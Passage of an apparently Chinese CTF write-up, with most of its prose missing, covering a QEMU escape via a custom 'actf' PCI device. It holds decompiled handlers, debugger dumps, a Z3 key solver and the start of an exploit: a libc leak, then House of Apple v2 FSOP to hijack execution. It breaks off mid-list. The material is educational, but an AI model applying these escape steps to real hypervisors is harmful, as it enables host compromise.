&#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr - <span class="number">16</span> &lt;= <span class="number">0xF</span> &amp;&amp; *((_BYTE *)v4 + <span class="number">2609</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = (__int64)v4[<span class="number">335</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="built_in">g_malloc</span>(<span class="number">32LL</span>);</span><br><span class="line">        v4[<span class="number">335</span>] = (<span class="type">const</span> <span class="type">char</span> ***)v9;</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)(v9 + (addr &amp; <span class="number">0xF</span>)) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)v4 + <span class="number">2608</span>) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">qemu_mutex_unlock</span>((<span class="type">pthread_mutex_t</span> *)v4 + <span class="number">81</span>, (<span class="type">int</span>)<span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x8B</span>u, v5, v6, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="comment"># lspci</span></span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:ac7f</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line"></span><br><span class="line">~ <span class="comment"># cat /sys/devices/pci0000:00/0000:00:04.0/resource</span></span><br><span class="line">0x00000000febf1000 0x00000000febf1fff 0x0000000000040200</span><br><span class="line">0x000000000000c040 0x000000000000c05f 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>cpiomakefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CC := gcc</span><br><span class="line">CFLAGS := -no-pie -static</span><br><span class="line">SRC := exp.c</span><br><span class="line">TARGET := exp</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(SRC)</span></span><br><span class="line"><span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line">strip <span class="variable">$@</span></span><br><span class="line">find . | cpio -ov --format=newc  | gzip -9 &gt; ../rootfs.cpio.gz</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure><p>mmio_read&#x2F;write 0xa38 0x0~0x44pmio_read 0xa30 ActfState</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="variable">$rdi</span>+<span class="variable">$rsi</span>+0xa38</span><br><span class="line"><span class="variable">$3</span> = 0x56327d1bc568</span><br><span class="line">pwndbg&gt; tele 0x56327d1bc568</span><br><span class="line">00:0000  0x56327d1bc568  0x0</span><br><span class="line">...      7 skipped</span><br><span class="line">pwndbg&gt; tele 0x56327d1bc568-0xa38+0xa30</span><br><span class="line">00:0000  0x56327d1bc560  0x1234ac7f00000000</span><br><span class="line">01:0008  0x56327d1bc568  0x0</span><br><span class="line">...      6 skipped</span><br><span class="line">pwndbg&gt; tele 0x56327d1bc568-0xa38</span><br><span class="line">00:0000 rdi 0x56327d1bbb30  0x56327c433850  0x56327c1888d0  0x56327c156b10  0x560066746361 /* <span class="string">&#x27;actf&#x27;</span> */</span><br><span class="line">01:0008     0x56327d1bbb38  0x7ff383e92d50 (g_free)  endbr64</span><br><span class="line">02:0010     0x56327d1bbb40  0x56327d1b86a0  0x8</span><br><span class="line">03:0018     0x56327d1bbb48  0xc /* <span class="string">&#x27;\x0c&#x27;</span> */</span><br><span class="line">04:0020     0x56327d1bbb50  0x56327c437360  0x56327c36b930  0x56327c1d2260  0x56327c1d23e0  ...</span><br><span class="line">05:0028     0x56327d1bbb58  0x0</span><br><span class="line">06:0030     0x56327d1bbb60  0x56327d1b9ef0  <span class="string">&#x27;/machine/peripheral-anon/device[0]&#x27;</span></span><br><span class="line">07:0038     0x56327d1bbb68  0x1</span><br></pre></td></tr></table></figure><p>pmio_read0xa311</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr - <span class="number">16</span> &gt; <span class="number">0xF</span> || !*((_BYTE *)v2 + <span class="number">0xA31</span>) )</span><br></pre></td></tr></table></figure><p>pmio_write128</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_409F40</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****actfState; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> actfDW; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****_actfState; <span class="comment">// r10</span></span><br><span class="line">  __m128i *actfBuf0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">const</span> __m128i *actfBuf2; <span class="comment">// r11</span></span><br><span class="line">  __int64 *_stackBuf; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> offset; <span class="comment">// r8d</span></span><br><span class="line">  __m128i *__actfBuf0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 *__stackbuf; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">const</span> __m128i *_actfBuf2; <span class="comment">// rsi</span></span><br><span class="line">  __m128i actfBuf1; <span class="comment">// xmm2</span></span><br><span class="line">  <span class="type">char</span> byte1; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// cl</span></span><br><span class="line">  __m128i ___actfBuf0; <span class="comment">// xmm5</span></span><br><span class="line">  __m128i _____actfBuf1; <span class="comment">// xmm6</span></span><br><span class="line">  __int128 v16; <span class="comment">// rax</span></span><br><span class="line">  __int128 v18; <span class="comment">// rax</span></span><br><span class="line">  __int128 stackBuf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-98h] BYREF</span></span><br><span class="line">  __int64 endStackBuf[<span class="number">2</span>]; <span class="comment">// [rsp+20h] [rbp-78h] BYREF</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+30h] [rbp-68h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+38h] [rbp-60h]</span></span><br><span class="line">  __m128i _actfBuf0; <span class="comment">// [rsp+40h] [rbp-58h] BYREF</span></span><br><span class="line">  __m128i ___actfBuf1; <span class="comment">// [rsp+50h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v25; <span class="comment">// [rsp+68h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v25 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  actfState = <span class="built_in">object_dynamic_cast_assert</span>(opaque, <span class="string">&quot;actf&quot;</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x24</span>u, <span class="string">&quot;ACTF&quot;</span>);</span><br><span class="line">  actfDW = *((_DWORD *)actfState + <span class="number">0x28D</span>);      <span class="comment">// 0xa34: 0x1234ac7f</span></span><br><span class="line">  _actfState = actfState;</span><br><span class="line">  <span class="built_in">memset</span>(stackBuf, <span class="number">0</span>, <span class="built_in">sizeof</span>(stackBuf));</span><br><span class="line">  actfBuf0 = (__m128i *)(actfState + <span class="number">0x147</span>);    <span class="comment">// a38</span></span><br><span class="line">  actfBuf2 = (<span class="type">const</span> __m128i *)(actfState + <span class="number">0x14B</span>);<span class="comment">// a58</span></span><br><span class="line">  _stackBuf = (__int64 *)stackBuf;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)_stackBuf = actfDW;</span><br><span class="line">    _stackBuf = (__int64 *)((<span class="type">char</span> *)_stackBuf + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( _stackBuf != endStackBuf );           <span class="comment">//  8 * 0x1234ac7f </span></span><br><span class="line">  offset = -(<span class="type">int</span>)actfBuf2;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    __actfBuf0 = &amp;_actfBuf0;</span><br><span class="line">    __stackbuf = (__int64 *)stackBuf;</span><br><span class="line">    _actfBuf2 = actfBuf2;</span><br><span class="line">    actfBuf1 = _mm_loadu_si128((<span class="type">const</span> __m128i *)(_actfState + <span class="number">0x149</span>));<span class="comment">// a48</span></span><br><span class="line">    _actfBuf0 = _mm_loadu_si128((<span class="type">const</span> __m128i *)(_actfState + <span class="number">0x147</span>));<span class="comment">// a38</span></span><br><span class="line">    ___actfBuf1 = actfBuf1;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      byte1 = __actfBuf0-&gt;m128i_i8[<span class="number">0</span>] ^ _actfBuf2-&gt;m128i_i8[<span class="number">0</span>];</span><br><span class="line">      __stackbuf = (__int64 *)((<span class="type">char</span> *)__stackbuf + <span class="number">1</span>);</span><br><span class="line">      v13 = *((_BYTE *)__stackbuf - <span class="number">1</span>) ^ (offset + (_BYTE)_actfBuf2);<span class="comment">// stackBuf  ^ 0,1,2...</span></span><br><span class="line">      _actfBuf2 = (<span class="type">const</span> __m128i *)((<span class="type">char</span> *)_actfBuf2 + <span class="number">1</span>);</span><br><span class="line">      __actfBuf0 = (__m128i *)((<span class="type">char</span> *)__actfBuf0 + <span class="number">1</span>);</span><br><span class="line">      *((_BYTE *)__stackbuf - <span class="number">1</span>) = v13;         <span class="comment">// stackBuf stackBuf</span></span><br><span class="line">      __actfBuf0[<span class="number">-1</span>].m128i_i8[<span class="number">15</span>] = v13 ^ byte1;<span class="comment">//  actfBuf </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( __stackbuf != endStackBuf );</span><br><span class="line">    ___actfBuf0 = _mm_load_si128(&amp;_actfBuf0);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(offset) = offset + <span class="number">0x11</span>;</span><br><span class="line">    _____actfBuf1 = _mm_load_si128(&amp;___actfBuf1);</span><br><span class="line">    *actfBuf0 = _mm_loadu_si128(actfBuf2);</span><br><span class="line">    actfBuf0[<span class="number">1</span>] = _mm_loadu_si128(actfBuf2 + <span class="number">1</span>);</span><br><span class="line">    *(__m128i *)(_actfState + <span class="number">331</span>) = ___actfBuf0;<span class="comment">// a58</span></span><br><span class="line">    *(__m128i *)(_actfState + <span class="number">333</span>) = _____actfBuf1;<span class="comment">// a68</span></span><br><span class="line">                                                <span class="comment">// swap a38 swap a58 0x20</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (_BYTE)offset != <span class="number">0xAA</span> - (_BYTE)actfBuf2 );<span class="comment">// 10</span></span><br><span class="line">  endStackBuf[<span class="number">0</span>] = <span class="number">0xABA29EC2A98DD89A</span>LL;</span><br><span class="line">  *((_QWORD *)&amp;v16 + <span class="number">1</span>) = (<span class="type">unsigned</span> __int64)_actfState[<span class="number">327</span>] ^ <span class="number">0xABA29EC2A98DD89A</span>LL;<span class="comment">// a38</span></span><br><span class="line">  endStackBuf[<span class="number">1</span>] = <span class="number">0xBBF1B4AB81B4A9D4</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;v16 = actfBuf0-&gt;m128i_i64[<span class="number">1</span>] ^ <span class="number">0xBBF1B4AB81B4A9D4</span>LL;</span><br><span class="line">  v21 = <span class="number">0xFB92A48DB386FFA8</span>LL;</span><br><span class="line">  v22 = <span class="number">0xEFB491B8AFB4ABD3</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( v16 == <span class="number">0</span> &amp;&amp; !(v21 ^ actfBuf0[<span class="number">1</span>].m128i_i64[<span class="number">0</span>] | actfBuf0[<span class="number">1</span>].m128i_i64[<span class="number">1</span>] ^ <span class="number">0xEFB491B8AFB4ABD3</span>LL) )<span class="comment">// 0actfBuf0</span></span><br><span class="line">  &#123;</span><br><span class="line">    _actfBuf0.m128i_i64[<span class="number">0</span>] = <span class="number">0x80EF69F1CBD00397</span>LL;</span><br><span class="line">    *((_QWORD *)&amp;v18 + <span class="number">1</span>) = (<span class="type">unsigned</span> __int64)_actfState[<span class="number">331</span>] ^ <span class="number">0x80EF69F1CBD00397</span>LL;<span class="comment">// a58</span></span><br><span class="line">    _actfBuf0.m128i_i64[<span class="number">1</span>] = <span class="number">0xB2EB07859CDA52D3</span>LL;</span><br><span class="line">    *(_QWORD *)&amp;v18 = actfBuf2-&gt;m128i_i64[<span class="number">1</span>] ^ <span class="number">0xB2EB07859CDA52D3</span>LL;</span><br><span class="line">    ___actfBuf1.m128i_i64[<span class="number">0</span>] = <span class="number">0xEC9E22F5A5A07FA3</span>LL;</span><br><span class="line">    ___actfBuf1.m128i_i64[<span class="number">1</span>] = <span class="number">0x4B36DF7B5B655A84</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">0</span></span><br><span class="line">      &amp;&amp; !(___actfBuf1.m128i_i64[<span class="number">0</span>] ^ actfBuf2[<span class="number">1</span>].m128i_i64[<span class="number">0</span>] | actfBuf2[<span class="number">1</span>].m128i_i64[<span class="number">1</span>] ^ <span class="number">0x4B36DF7B5B655A84</span>LL) )<span class="comment">// actfBuf2</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)_actfState + <span class="number">0xA31</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)_actfState + <span class="number">0xA30</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">buf0<span class="number">-20</span> byte</span><br><span class="line"><span class="number">0xABA29EC2A98DD89A</span>LL</span><br><span class="line"><span class="number">0xBBF1B4AB81B4A9D4</span>LL</span><br><span class="line"><span class="number">0xFB92A48DB386FFA8</span>LL</span><br><span class="line"><span class="number">0xEFB491B8AFB4ABD3</span>LL</span><br><span class="line">buf2<span class="number">-20b</span>yte</span><br><span class="line"><span class="number">0x80EF69F1CBD00397</span>LL</span><br><span class="line"><span class="number">0xB2EB07859CDA52D3</span>LL</span><br><span class="line"><span class="number">0xEC9E22F5A5A07FA3</span>LL</span><br><span class="line"><span class="number">0x4B36DF7B5B655A84</span>LL</span><br></pre></td></tr></table></figure><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">buffer0 = [?] * <span class="number">0x20</span></span><br><span class="line">buffer2 = [?] * <span class="number">0x20</span></span><br><span class="line">stackBuf = [<span class="number">0x7f</span>, <span class="number">0xac</span>, <span class="number">0x34</span>, <span class="number">0x12</span>] * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    b1 = buffer0[j] ^ buffer2[j]</span><br><span class="line">    b2 = stackBuf[j] ^ (i * <span class="number">0x11</span> + j) &amp; <span class="number">0xff</span>)</span><br><span class="line">    stackBuf[j] = b2</span><br><span class="line">    buffer0[j] = b1 ^ b2</span><br><span class="line">    buffer0, buffer2 = buffer2, buffer0</span><br></pre></td></tr></table></figure><p>Z3-SolverSolver add </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">buffer0 = [?] * 0x20</span></span><br><span class="line"><span class="string">buffer2 = [?] * 0x20</span></span><br><span class="line"><span class="string">stackBuf = [0x7f, 0xac, 0x34, 0x12] * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(10):</span></span><br><span class="line"><span class="string">  for j in range(32):</span></span><br><span class="line"><span class="string">    b1 = buffer0[j] ^ buffer2[j]</span></span><br><span class="line"><span class="string">    b2 = stackBuf[j] ^ (i * 0x11 + j) &amp; 0xff)</span></span><br><span class="line"><span class="string">    stackBuf[j] = b2</span></span><br><span class="line"><span class="string">    buffer0[j] = b1 ^ b2</span></span><br><span class="line"><span class="string">    buffer0, buffer2 = buffer2, buffer0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sol = Solver()</span><br><span class="line"></span><br><span class="line">stackBuf = [<span class="number">0x7f</span>, <span class="number">0xac</span>, <span class="number">0x34</span>, <span class="number">0x12</span>] * <span class="number">8</span></span><br><span class="line">buf = [BitVec(<span class="string">f&#x27;buf<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>)]</span><br><span class="line">tmp = [BitVec(<span class="string">f&#x27;tmp<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>)]</span><br><span class="line">order = buf.copy()  <span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    sol.add(buf[i] &lt;= <span class="number">0x7f</span>)</span><br><span class="line">    sol.add(buf[i] &gt;= <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">ans = [</span><br><span class="line">    <span class="number">0xABA29EC2A98DD89A</span>,</span><br><span class="line">    <span class="number">0xBBF1B4AB81B4A9D4</span>,</span><br><span class="line">    <span class="number">0xFB92A48DB386FFA8</span>,</span><br><span class="line">    <span class="number">0xEFB491B8AFB4ABD3</span>,</span><br><span class="line">    <span class="number">0x80EF69F1CBD00397</span>,</span><br><span class="line">    <span class="number">0xB2EB07859CDA52D3</span>,</span><br><span class="line">    <span class="number">0xEC9E22F5A5A07FA3</span>,</span><br><span class="line">    <span class="number">0x4B36DF7B5B655A84</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">byteans = <span class="string">b&#x27;&#x27;</span>.join([pack(<span class="string">&quot;&lt;Q&quot;</span>, num) <span class="keyword">for</span> num <span class="keyword">in</span> ans])</span><br><span class="line"><span class="comment"># print(byteans)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        b1 = buf[j] ^ buf[j + <span class="number">0x20</span>]</span><br><span class="line">        b2 = stackBuf[j] ^ ((j + <span class="number">0x11</span> * i) &amp; <span class="number">0xFF</span>)</span><br><span class="line">        stackBuf[j] = b2</span><br><span class="line">        tmp[j] = b2 ^ b1  <span class="comment"># buf20</span></span><br><span class="line"></span><br><span class="line">    buf[:<span class="number">0x20</span>] = buf[<span class="number">0x20</span>:]</span><br><span class="line">    buf[<span class="number">0x20</span>:] = tmp[:<span class="number">0x20</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(byteans) == <span class="number">0x40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    sol.add(byteans[i] == buf[i])</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">if</span> sol.check() == sat:</span><br><span class="line">    model = sol.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> order:</span><br><span class="line">        flag.append(<span class="built_in">int</span>(<span class="string">f&#x27;<span class="subst">&#123;model[i]&#125;</span>&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] no sol&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>pmio_write  <code>0xa78</code>  <code>malloc(0x20)</code>pmio_readlibc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x55e880791b30+0xa78</span><br><span class="line">00:0000  0x55e8807925a8  0x7f712072fde0  0x7f71deadbeef</span><br></pre></td></tr></table></figure><p>mmio_read&#x2F;write 4 <code>&lt;= 0x40</code>A78pmio4vmmaplibcrwx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7f7130000000     0x7f716ffff000 rwxp 3ffff000      0 [anon_7f7130000] </span><br><span class="line">...</span><br><span class="line">0x7f7177f7d000     0x7f7177fa5000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f7177fa5000     0x7f717813a000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f717813a000     0x7f7178192000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f7178192000     0x7f7178193000 ---p     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f7178193000     0x7f7178197000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f7178197000     0x7f7178199000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure><p>mmio_write <code>IO_list_all</code> house of apple V2exitqemu</p><p>libcmain_arena</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pagenamelibc</span></span><br><span class="line"><span class="comment"># offset: </span></span><br><span class="line">pwndbg&gt; leakfind <span class="variable">$rsp</span> --page_name=filename --max_offset=0x48 --max_depth=6</span><br><span class="line"></span><br><span class="line"><span class="comment"># [*] exp.c       leak : 0x7fa420824160</span></span><br><span class="line">pwndbg&gt; leakfind 0x7fa420000000 --max_offset=0x10000 --page_name=libc -s 8 -d 3</span><br><span class="line">0x7fa420000000+0x8a0  0x7fa470000030+0x870  0x7fa4795e6c80 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure><p>house of apple v2 </p><ul><li><code>_flags</code><code>shell</code></li><li><code>vtable</code><code>_IO_wfile_jumps</code><code>(A+0xd8) = _IO_wfile_overflow</code></li><li><code>_wide_data</code><code>A</code><code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code><code>0</code><code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code><code>0</code><code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code><code>B</code><code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code><code>C</code><code>RIP</code><code>*(B + 0x68) = 